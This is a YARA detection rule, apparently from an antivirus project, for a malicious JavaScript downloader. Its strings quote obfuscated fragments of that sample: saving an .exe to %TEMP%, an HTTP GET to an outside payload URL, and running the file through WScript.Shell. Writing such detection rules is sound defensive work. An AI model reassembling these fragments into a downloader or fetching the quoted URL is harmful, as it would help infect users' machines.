rule sig_20160328_44e229146d85f70370f8c8ac66c9e62c {
  meta:
    description = "datamaliciousorder - file 20160328_44e229146d85f70370f8c8ac66c9e62c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "784de6ddd3a8acd4dcf64de46df47f9703d14afc92f9afc8e31c55b57408e6b6"

  strings:
    $s1  = "function Yahvublfoo() {return Dnvtvvmocs[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"Ecy5jtqdKl9.exe\";};" fullword ascii
    $s2  = "Wkqlwhwej[Ufptjlgqw](\"GET\", \"http://foothillsofhemet.com/k4sifs\", false);" fullword ascii
    $s3  = "do {WScript[Dotkoxiy](Smkpcxmvay() * 11)} while (Wkqlwhwej[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Dnvtvvmocs = function Jyeezc() {return WScript[Cjotydbu](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Bfmsit(Drpyzg, Kejmjwhdzr){return Drpyzg - Kejmjwhdzr;};" fullword ascii
    $s6  = "function Lppvrwbn(Mwigedaped){Dnvtvvmocs[\"Run\"](Mwigedaped, Afgqge, Afgqge);};" fullword ascii
    $s7  = "function Pwtfike() {return ((Venoggow == true) && (Venoggow == Rvxylan)) ? 1 : Afgqge;};" fullword ascii
    $s8  = "return Bfmsit(Bwuhekhps, Ptjpx);" fullword ascii
    $s9  = "var Rvxylan = false;" fullword ascii
    $s10 = "var Mjrextqm = new this[\"Date\"]();" fullword ascii
    $s11 = "var Qwoxhgllws = false;" fullword ascii
    $s12 = "Venoggow = true; " fullword ascii
    $s13 = " while (Qivbtfyq){" fullword ascii
    $s14 = "function Lexuphw(Kfpuejjgwf) {var Dtxelr = (1, 2, 3, 4, 5, Kfpuejjgwf); return Dtxelr;};" fullword ascii
    $s15 = "function Sucibds()" fullword ascii
    $s16 = "var Venoggow = false;" fullword ascii
    $s17 = "function Lerlk(){return Agtbbpj;};" fullword ascii
    $s18 = "function Acurcxckn(){return Cjotydbu;};" fullword ascii
    $s19 = "Rvxylan = true; " fullword ascii
    $s20 = "function Smkpcxmvay(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}